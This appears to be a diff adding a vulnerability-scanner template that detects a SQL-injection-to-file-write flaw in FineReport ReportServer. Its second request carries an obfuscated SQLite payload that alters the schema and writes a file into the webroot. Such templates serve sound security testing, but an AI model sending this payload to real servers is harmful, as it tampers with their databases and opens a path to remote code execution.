@@ -1,0 +1,59 @@
+id: finereport-sqlite-filewrite-rce
+
+info:
+  name: FineReport ReportServer SQLite File Write Remote Code Execution
+  author: f1733
+  severity: critical
+  description: FineReport ReportServer endpoint is vulnerable to SQL injection leading to arbitrary file write via SQLite, which may result in remote code execution.
+  reference:
+    - https://
+  tags: finereport,sqli,filewrite,rce
+
+flow: http(1) && http(2) && http(3)
+
+variables:
+  filename: "{{randstr}}"
+
+http:
+  - raw:
+      - |
+        GET /webroot/ReportServer HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        viewlets: [{'reportlet':'/'}]
+        op: getSessionID
+
+    extractors:
+      - type: regex
+        name: id_upload
+        part: body
+        internal: true
+        regex:
+          - "[0-9a-fA-F-]{36}"
+
+  - raw:
+      - |
+        GET /webroot/decision/nx/report/v9/largedataset/export/excel?functionParams=%7b%7d&__parameters__=%7b%7d HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        sessionID: {{id_upload}}
+        params: %3Cpd%3E%0A%3CLargeDatasetExcelExportJS+dsName%3D%221%22%3E%0A%3CParameters%3E%3CParameter%3E%0A%3CAttributes+name%3D%22c%22/%3E%3CO+t%3D%22Formula%22%3E%3CAttributes%3E%3C%21%5BCDATA%5Bsql('FRDemo',CONCATENATE('pr','agm','a wr','i','t','a','ble','_sch','e','ma=o','n'),1)-sql('FRDemo',CONCATENATE('dele','t','e f','r','o','m sq','li','t','e_sc','he','ma w','here',' na','m','e!','=','''s','ql','ite','_s','ta','t','1'''),1)-sql('FRDemo',CONCATENATE('an','aly','ze'),1)-sql('FRDemo',CONCATENATE('re','p','lac','e i','nto',' s','ql','ite_','st','at','1 va','lu','es(''',''',123''')'),1)-sql('FRDemo',CONCATENATE('V','A','C','U','U','M',' i','nt','o(''',ENV_HOME,'/.././','{{filename}}','.txt''')'),1)%5D%5D%3E%3C/Attributes%3E%3C/O%3E%3C/Parameter%3E%3C/Parameters%3E%3C/LargeDatasetExcelExportJS%3E%3C/pd%3E
+
+    unsafe: true
+
+  - raw:
+      - |
+        GET /webroot/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SQLite"
+
+      - type: status
+        status:
+          - 200
